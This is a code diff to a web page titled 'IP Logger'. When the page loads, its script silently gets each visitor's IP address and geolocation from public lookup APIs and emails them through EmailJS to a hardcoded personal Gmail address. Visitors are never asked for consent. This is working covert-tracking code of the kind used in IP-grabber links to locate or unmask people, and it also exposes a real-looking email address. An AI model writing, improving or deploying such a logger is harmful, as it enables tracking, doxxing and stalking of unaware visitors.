@@ -5,24 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Logger</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
 </head>
 <body>
     <h1>Your IP Address Logger</h1>
     <script>
-        $(document).ready(function() {
+        (function(){
+            // Initialize EmailJS
+            emailjs.init("your_user_id"); // Replace with your EmailJS User ID
+
             // Automatically get IP address and location on page load
             $.get('https://api.ipify.org?format=json', function(data) {
                 const ip = data.ip;
                 $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
-                    // Send data to your serverless function
-                    $.post('https://your-function-url', {
+                    const emailParams = {
                         ip: ip,
-                        location: locationData,
-                        email: 'fabegabe26@gmail.com' // Email address to send the data
-                    });
+                        location: JSON.stringify(locationData, null, 2), // Convert to string for email
+                        to_email: 'fabegabe26@gmail.com' // Your email address
+                    };
+
+                    // Send the email using EmailJS
+                    emailjs.send("your_service_id", "your_template_id", emailParams)
+                        .then((response) => {
+                            console.log('SUCCESS!', response.status, response.text);
+                        }, (error) => {
+                            console.log('FAILED...', error);
+                        });
                 });
             });
-        });
+        })();
     </script>
 </body>
 </html>
